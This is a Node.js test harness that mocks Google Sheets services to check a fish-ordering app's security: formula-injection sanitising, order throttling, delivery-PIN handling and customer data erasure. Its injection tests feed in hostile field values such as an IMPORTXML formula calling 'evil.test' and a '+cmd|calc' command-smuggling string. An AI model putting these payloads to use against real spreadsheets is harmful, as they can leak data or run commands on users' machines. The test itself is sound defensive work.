const fs=require('fs'),vm=require('vm');
function Sheet(name,rows){this.name=name;this.d=rows;}
Sheet.prototype.getName=function(){return this.name};
Sheet.prototype.appendRow=function(r){this.d.push(r.slice())};
Sheet.prototype.setFrozenRows=function(){};
Sheet.prototype.getLastRow=function(){return this.d.length};
Sheet.prototype.getLastColumn=function(){return Math.max(0,...this.d.map(r=>r.length))};
Sheet.prototype.getDataRange=function(){return this.getRange(1,1,this.d.length,this.getLastColumn())};
Sheet.prototype.getRange=function(r,c,nr,nc){
  if(typeof r==='string'){const m=r.match(/([A-Z])(\d+)/);c=m[1].charCodeAt(0)-64;r=+m[2];nr=1;nc=1}
  globalThis.CALLS++;nr=nr||1;nc=nc||1;const sh=this;
  const ensure=()=>{while(sh.d.length<r+nr-1)sh.d.push([]);for(let i=0;i<nr;i++){while(sh.d[r-1+i].length<c+nc-1)sh.d[r-1+i].push('')}};
  const rg={getValues(){ensure();return sh.d.slice(r-1,r-1+nr).map(row=>row.slice(c-1,c-1+nc))},
    getDisplayValues(){return rg.getValues().map(x=>x.map(v=>String(v)))},getValue(){return rg.getValues()[0][0]},getDisplayValue(){return String(rg.getValue())},
    setValues(v){ensure();v.forEach((row,i)=>row.forEach((x,j)=>sh.d[r-1+i][c-1+j]=x));return rg},setValue(x){ensure();sh.d[r-1][c-1]=x;return rg},
    setNumberFormat(){return rg},setNumberFormats(){return rg},setFontWeight(){return rg},setBackground(){return rg},setFontColor(){return rg},setDataValidation(){return rg},getRow(){return r}};
  return rg;};
const sheets={
 Products:new Sheet('Products',[['Group','Name','English name','Marathi name','Price per kg','From','Cuts','Available','Kg for this window','Kg ordered','Kg left'],
   ['Fish','Surmai','King fish','सुरमई',1200,'the Konkan coast','Whole | Curry cut','Yes','','',''],
   ['Fish','Bangda','Mackerel','बांगडा',320,'North Goa','Whole','Yes','','',''],
   ['Prawns','Kolambi','Prawns','कोळंबी',600,'','Whole | Cleaned','Yes','','','']]),
 Orders:new Sheet('Orders',[['Order ID','Placed at','Window','Name','Mobile','Address','Area','Items','Subtotal','Delivery','Total','Status','Notes']]),
 'Order lines':new Sheet('Order lines',[['Order ID','Window','Item','Pack','Cut','Qty','Kg','Line total','Status']]),
 Settings:new Sheet('Settings',[['Setting','Value'],['Current window (filled in automatically)',''],['Delivery fee (₹)',40]])
};
let cache={},props={};globalThis.FILES={};globalThis.FN=0;globalThis.CALLS=0;
const ctx={console,__now:Date.UTC(2026,9,28,4,0)};   // 09:30 IST, Wed 28 Oct
class FD extends Date{constructor(...a){if(a.length)super(...a);else super(ctx.__now)} static now(){return ctx.__now}}
const ist=d=>new Date(d.getTime()+330*60000), p2=n=>String(n).padStart(2,'0'), DN=['Sun','Mon','Tue','Wed','Thu','Fri','Sat'], MN=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
Object.assign(ctx,{Date:FD,
 SpreadsheetApp:{getActiveSpreadsheet:()=>({getSheetByName:n=>sheets[n],insertSheet:n=>(sheets[n]=new Sheet(n,[])),getUrl:()=>'URL',getSpreadsheetTimeZone:()=>'Asia/Kolkata'}),newDataValidation:()=>({requireValueInList(){return this},setAllowInvalid(){return this},build(){return 1}})},
 Utilities:{base64Encode:a=>Buffer.from(a).toString('base64'),newBlob:(h,t,n)=>({getAs:()=>{const o={name:n,getBytes:()=>[37,80,68,70],setName(x){o.name=x;return o}};return o}}),getUuid:()=>'a1b2c3d4e5f67890abcdef',formatDate:(d,tz,f)=>{const t=ist(d);
   const map={'yy-MM':String(t.getUTCFullYear()).slice(-2)+'-'+p2(t.getUTCMonth()+1),'yy':String(t.getUTCFullYear()).slice(-2),'MM':p2(t.getUTCMonth()+1),'yyyy':String(t.getUTCFullYear()),'H':String(t.getUTCHours()),'m':String(t.getUTCMinutes()),'u':String(t.getUTCDay()||7),'yyyy-MM-dd':t.getUTCFullYear()+'-'+p2(t.getUTCMonth()+1)+'-'+p2(t.getUTCDate()),
     'yyyy-MM-dd HH:mm':t.getUTCFullYear()+'-'+p2(t.getUTCMonth()+1)+'-'+p2(t.getUTCDate())+' '+p2(t.getUTCHours())+':'+p2(t.getUTCMinutes()),
     'ddMM':p2(t.getUTCDate())+p2(t.getUTCMonth()+1),'yyyy-MM-dd EEE':t.getUTCFullYear()+'-'+p2(t.getUTCMonth()+1)+'-'+p2(t.getUTCDate())+' '+DN[t.getUTCDay()],
     'dd MMM yyyy, h:mm a':p2(t.getUTCDate())+' '+MN[t.getUTCMonth()]+' '+t.getUTCFullYear()+', '+((t.getUTCHours()%12)||12)+':'+p2(t.getUTCMinutes())+' '+(t.getUTCHours()<12?'AM':'PM')};
   return map[f]!==undefined?map[f]:t.toISOString();}},
 DriveApp:{getFoldersByName:()=>({hasNext:()=>true,next:()=>({createFile:b=>{const id='F'+'x'.repeat(30)+(++globalThis.FN);FILES[id]=b;return {getUrl:()=>'https://drive.google.com/file/d/'+id+'/view',getName:()=>b.name}}})}),getFileById:id=>{const b=FILES[id];if(!b)throw new Error('nf');return {getName:()=>b.name,getBlob:()=>({getBytes:()=>[37,80,68,70]})}}},
 LockService:{getScriptLock:()=>({tryLock:()=>true,releaseLock:()=>{}})},
 CacheService:{getScriptCache:()=>({get:k=>cache[k]||null,put:(k,v)=>{cache[k]=v},remove:k=>{delete cache[k]}})},
 PropertiesService:{getScriptProperties:()=>({getProperty:k=>props[k]||null,setProperty:(k,v)=>{props[k]=v}})},
 ContentService:{MimeType:{JSON:1},createTextOutput:t=>({setMimeType(){return JSON.parse(t)}})}});
vm.createContext(ctx);vm.runInContext(fs.readFileSync(process.argv[2],'utf8'),ctx);
const post=o=>ctx.doPost({postData:{contents:JSON.stringify(o)}});
const get=p=>ctx.doGet({parameter:p||{}});
const setS=(pre,v)=>sheets.Settings.d.forEach(r=>{if(String(r[0]).startsWith(pre))r[1]=v});
ctx.setup_(); setS('Admin password','fish-2026!');
const A=o=>post(Object.assign({action:'admin',pw:'fish-2026!',by:'Vaishnav'},o));
// ---------- security and data rights ----------
let fails=0; const ok=(name,cond,extra)=>{ if(!cond){fails++;} console.log((cond?'PASS ':'FAIL ')+name+(cond?'':' '+JSON.stringify(extra))); };
ctx.__now = Date.UTC(2026,10,22,3,40);
setS('Delivery PIN','111111'); setS('Packing PIN','222222');
A({op:'lots',fish:'Bangda',harbour:'Malvan',live:true,rows:[{size:'Small to medium',kg:40,price:300}]});
let g=get(); const key=g.products.find(p=>p.name==='Bangda').options[0].key;
const item=[{name:'Bangda',key:key,pack:'500 g',cut:'Whole',qty:1}];
const ordCol=n=>sheets.Orders.d[0].indexOf(n);
const cell=(row,n)=>sheets.Orders.d[row][ordCol(n)];

// 1 formula injection
let r=post({name:'=IMPORTXML("http://evil.test","//a")',phone:'9876500001',address:'+cmd|calc',area:'@SUM(A1)',notes:'-2+3',items:item,agree:true});
ok('order placed', r.ok, r);
ok('name has no leading =', cell(1,'Name').indexOf('=')!==0 && cell(1,'Name').startsWith('IMPORTXML'), cell(1,'Name'));
ok('address/area/notes have no leading + @ -', /^[^=+\-@]/.test(cell(1,'Address')+'x') && !/^[=+\-@]/.test(cell(1,'Area')) && !/^[=+\-@]/.test(cell(1,'Notes')), [cell(1,'Address'),cell(1,'Area'),cell(1,'Notes')]);
ok('consent recorded', cell(1,'Agreed to')==='Terms and Privacy 2026-11-22', cell(1,'Agreed to'));
r=post({name:'Plain',phone:'9876500002',address:'Rajarampuri',items:item});
ok('no consent flag -> blank', r.ok && cell(2,'Agreed to')==='', cell(2,'Agreed to'));

// 2 order throttle per phone
let many=null; for(let i=0;i<8;i++){ const x=post({name:'Spam',phone:'9876500003',address:'x',items:item}); if(!x.ok){many=x;break;} }
ok('7th order in an hour refused', many&&many.error==='many', many);
ok('other phone unaffected', post({name:'Ok',phone:'9876500004',address:'x',items:item}).ok);

// 3 delivery PIN no longer accepted in the web address
ok('GET deliveries no longer serves data', !get({action:'deliveries',pin:'111111'}).orders, get({action:'deliveries',pin:'111111'}));
let d=post({action:'deliveries',pin:'111111'}); ok('POST deliveries works for the rider', d.ok&&d.roles.indexOf('delivery')>-1&&Array.isArray(d.orders), d);
ok('POST deliveries wrong PIN refused', post({action:'deliveries',pin:'000000'}).error==='pin');

// 4 data requests
ok('request needs a valid mobile', post({action:'datareq',phone:'123',type:'Delete my data'}).error==='details');
ok('request needs a valid type', post({action:'datareq',phone:'9876500001',type:'Rob a bank'}).error==='details');
let q=post({action:'datareq',phone:'98765 00001',name:'=HYPERLINK("x")',type:'Delete my data',details:'please delete'});
ok('request logged', q.ok&&q.id==='D001', q);
ok('4th request in a day refused', (post({action:'datareq',phone:'9876500001',type:'Show my data'}),post({action:'datareq',phone:'9876500001',type:'Show my data'}),post({action:'datareq',phone:'9876500001',type:'Show my data'}).error==='many'));
let L=A({op:'load'}); ok('admin sees requests', L.dataRequests.length>=1 && L.dataRequests[L.dataRequests.length-1].name.indexOf('=')!==0, L.dataRequests);
// order 1 is still New: erase keeps it
let e=A({op:'erasecustomer',mobile:'9876500001'}); ok('active order is kept, not erased', e.ok&&e.erased===0&&e.kept===1, e);
ok('request stays open while an order is active', A({op:'load'}).dataRequests.filter(x=>x.id==='D001')[0].status==='Open');
// deliver then erase
const id1=cell(1,'Order ID'); A({op:'order',id:id1,status:'Delivered'});
e=A({op:'erasecustomer',mobile:'9876500001'}); ok('delivered order erased', e.ok&&e.erased===1&&e.kept===0, e);
ok('personal fields cleared', cell(1,'Name')==='Erased'&&cell(1,'Mobile')===''&&cell(1,'Address')===''&&cell(1,'Notes')===''&&cell(1,'Token')==='', sheets.Orders.d[1]);
ok('order id, items and total kept', cell(1,'Order ID')===id1&&cell(1,'Items')!==''&&Number(cell(1,'Total'))>0, sheets.Orders.d[1]);
ok('other customers untouched', cell(2,'Name')==='Plain'&&cell(2,'Mobile')==='9876500002', sheets.Orders.d[2]);
ok('request closed by the erase', A({op:'load'}).dataRequests.filter(x=>x.id==='D001')[0].status==='Done');
ok('erase logs counts only, no personal data', sheets['Admin log'].d.slice(-1)[0][2].indexOf('9876500001')===-1);
ok('bad mobile refused', A({op:'erasecustomer',mobile:'12'}).error==='bad');
ok('close request', A({op:'datareq',id:'D001',status:'Declined'}).ok&&A({op:'load'}).dataRequests.filter(x=>x.id==='D001')[0].status==='Declined');
ok('erase needs admin password', post({action:'admin',pw:'wrong-password',op:'erasecustomer',mobile:'9876500002'}).error==='wrong'&&cell(2,'Name')==='Plain');
// partner text is sanitised too
let pr=A({op:'partner',name:'=EVIL()',mobile:'9000000010',role:'Delivery',pin:'4321'}); 
ok('partner name sanitised', pr.ok&&sheets.Partners.d[sheets.Partners.d.length-1][1].indexOf('=')!==0, sheets.Partners.d.slice(-1));
console.log(fails?('FAILED '+fails):'ALL PASS'); process.exit(fails?1:0);
